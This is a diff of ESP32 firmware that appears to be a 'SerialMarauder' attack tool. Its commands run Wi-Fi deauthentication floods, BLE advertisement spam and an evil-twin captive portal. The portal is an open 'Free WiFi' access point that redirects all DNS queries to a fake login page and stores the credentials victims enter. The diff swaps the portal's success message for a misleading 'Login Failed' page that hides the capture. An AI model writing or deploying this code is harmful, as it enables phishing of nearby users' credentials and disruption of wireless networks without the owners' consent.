@@ -8,12 +8,12 @@
 #include <BLEServer.h>
 
 // ---------------- Captive Portal Variables and Functions ----------------
-const char* portalSSID = "Free_WiFi";
 IPAddress apIP(172, 16, 0, 1);
 IPAddress netMsk(255, 255, 255, 0);
 DNSServer dnsServer;
 WebServer webServer(80);
-bool captivePortalActive = false;  // Flag indicating if the captive portal is active
+bool captivePortalActive = false;  // Flag indicating if captive portal is active
+String currentAPSSID = "Free WiFi"; // Default AP SSID for non-captive functions
 String capturedCredentials = "";
 
 String loginPage() {
@@ -33,8 +33,8 @@ String loginPage() {
 }
 
 String successPage() {
-  return "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Success</title></head>"
-         "<body><h2>Login Successful</h2><p>Your credentials have been captured.</p></body></html>";
+  return "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Login Failed</title></head>"
+         "<body><h2>Login Failed</h2><p>Something went Wrong, Try again at a later time.</p></body></html>";
 }
 
 void handleRoot() {
@@ -61,7 +61,7 @@ void handleNotFound() {
 // Global flag for debug LED behavior
 bool debugLedEnabled = true;
 
-// Modified activity LED: only flashes if debug LED mode is enabled
+// Modified activity LED: flashes only if debug LED is enabled
 void activityLED() {
   if (debugLedEnabled) {
     digitalWrite(LED_BUILTIN, HIGH);
@@ -78,7 +78,7 @@ void scanWiFi() {
     Serial.printf("%d: %s (RSSI: %d) MAC: %s Channel: %d\n",
                   i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i),
                   WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
-    activityLED(); // Flash LED after printing each network if debug is enabled
+    activityLED(); // Flash LED after printing each network
   }
   Serial.println("Wi-Fi scan complete.");
 }
@@ -100,7 +100,7 @@ void deauthAttack(const char *targetMAC) {
   Serial.printf("Switching to channel %d for deauth attack on %s\n", targetChannel, targetMAC);
   esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
   
-  activityLED(); // Flash LED before sending the packet
+  activityLED(); // Flash before sending packet
   
   uint8_t deauthPacket[26] = {
     0xc0, 0x00, 0x3a, 0x01,
@@ -132,7 +132,7 @@ void scanBLE() {
     Serial.printf("Device %d: %s (Name: %s) (RSSI: %d)\n",
                   i + 1, device.getAddress().toString().c_str(),
                   deviceName.c_str(), device.getRSSI());
-    activityLED();  // Flash LED for each BLE device found if debug is enabled
+    activityLED();  // Flash LED for each BLE device found
   }
   Serial.println("BLE scan complete.");
 }
@@ -155,7 +155,7 @@ void blespamAttack() {
     pAdvertising->setAdvertisementData(advData);
     pAdvertising->setScanResponseData(advData);
     
-    activityLED();  // Flash LED with each burst if debug is enabled
+    activityLED();  // Flash LED with each burst
     pAdvertising->start();
     delay(10);      // Short burst duration
     pAdvertising->stop();
@@ -171,7 +171,6 @@ void toggleDebugLED() {
 
 // ---------------- Setup & Loop ----------------
 void setup() {
-  // Remove M5StickC initialization and LCD calls
   pinMode(LED_BUILTIN, OUTPUT);
   digitalWrite(LED_BUILTIN, LOW);
 
@@ -180,7 +179,8 @@ void setup() {
   // Setup Wi-Fi in AP mode for SerialMarauder functions (captive portal remains off by default)
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, netMsk);
-  WiFi.softAP(portalSSID);
+  // Start AP with the default SSID "Free WiFi"
+  WiFi.softAP(currentAPSSID.c_str());
   Serial.print("AP IP address: ");
   Serial.println(WiFi.softAPIP());
 
@@ -196,7 +196,8 @@ void setup() {
   Serial.println("  blescan      - BLE scan");
   Serial.println("  blespam      - BLE spam attack (5 sec)");
   Serial.println("  led          - Toggle debug LED flashing");
-  Serial.println("  portal       - Activate captive portal");
+  Serial.println("  portal       - Toggle captive portal SSID");
+  Serial.println("                (Activates with \"0x4F\" if off, then toggles to \"Free WiFi\" and back)");
   Serial.println("  stopportal   - Deactivate captive portal");
 }
 
@@ -224,13 +225,26 @@ void loop() {
     } else if (command == "led") {
       toggleDebugLED();
     } else if (command == "portal") {
+      // If portal is not active, activate with SSID "0x4F"
       if (!captivePortalActive) {
+        currentAPSSID = "0x4F";
         dnsServer.start(53, "*", apIP);
         webServer.begin();
         captivePortalActive = true;
-        Serial.println("Captive portal activated.");
+        WiFi.softAP(currentAPSSID.c_str());
+        Serial.print("Captive portal activated with SSID: ");
+        Serial.println(currentAPSSID);
       } else {
-        Serial.println("Captive portal is already active.");
+        // Toggle SSID between "0x4F" and "Free WiFi"
+        if (currentAPSSID == "0x4F") {
+          currentAPSSID = "Free WiFi";
+        } else {
+          currentAPSSID = "0x4F";
+        }
+        // Restart AP with new SSID
+        WiFi.softAP(currentAPSSID.c_str());
+        Serial.print("Captive portal SSID changed to: ");
+        Serial.println(currentAPSSID);
       }
     } else if (command == "stopportal") {
       if (captivePortalActive) {
